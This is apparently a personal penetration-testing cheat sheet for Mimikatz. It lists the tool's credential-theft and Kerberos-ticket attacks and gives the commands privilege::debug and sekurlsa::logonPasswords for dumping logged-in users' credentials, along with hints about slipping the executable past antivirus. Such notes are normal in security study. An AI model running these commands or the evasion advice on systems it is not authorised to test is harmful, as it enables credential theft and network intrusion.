-- -
Powerful tool, but will 100% get caught by any AV, IDS, IPS, etc tool deployed. You can get creative to get it past AVs, but if you try to run it without evasion techniques, then you will most likely get caught. 

Tool used to view/steal credentials, generate Kerberos tickets, dump credentials from memory, etc. 
Some attack vectors include: #dumpcreds #pass-the-hash #pass-the-password #over-pass-the-hash #pass-the-ticket #silverticket #GoldenTicket 
#### Get setup
Get the executable onto a windows system. Remember AV will most likely block you so you may need to get creative with getting it on the system and then get creative with running it.
```powershell
# if it allows the privilege::debug command go through, then you are good to go
mimikatz.exe
privilege::debug
```
#### Dump Credentials
```powershell
# dump credentials of users that have logged into the system
sekurlsa::logonPasswords
```

^950288

#### Resources
- [Gentil Kiwi Repo](https://github.com/gentilkiwi/mimikatz)